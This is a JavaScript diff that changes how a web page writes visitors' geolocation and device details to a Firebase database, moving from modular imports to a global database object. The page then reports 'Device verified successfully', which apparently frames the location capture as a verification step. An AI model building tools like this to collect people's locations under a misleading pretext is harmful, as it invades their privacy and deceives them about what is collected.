@@ -1,4 +1,3 @@
-import { firebaseReady } from './src/core/firebase-init.js';
 import { initializeTheme } from './src/features/theme/theme-manager.js';
 import { listenForLocationRequests, setupUnloadHandler } from './src/features/location/location-tracker.js';
 import { getDeviceInfo } from './src/utils/browser-detection.js';
@@ -20,9 +19,6 @@ function getGeolocationErrorMessage(error) {
 // Initialize Firebase and load theme
 document.addEventListener('DOMContentLoaded', async () => {
     try {
-        // Wait for Firebase to be ready
-        const database = await firebaseReady;
-        
         // Initialize theme system
         await initializeTheme();
 
@@ -84,9 +80,12 @@ document.addEventListener('DOMContentLoaded', async () => {
 
                 // Save location to Firebase
                 console.log('Saving to Firebase...');
-                const { ref, push, set } = window.firebase.database;
-                const locationsRef = ref(database, 'locations');
-                const newLocationRef = push(locationsRef);
+                if (!window.database) {
+                    throw new Error('Firebase database not initialized');
+                }
+
+                const locationsRef = window.database.ref('locations');
+                const newLocationRef = locationsRef.push();
 
                 const locationData = {
                     latitude: position.coords.latitude,
@@ -101,7 +100,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                     ...getDeviceInfo()
                 };
 
-                await set(newLocationRef, locationData);
+                await newLocationRef.set(locationData);
                 console.log('Location saved successfully');
 
                 locationStatus.textContent = 'Device verified successfully';
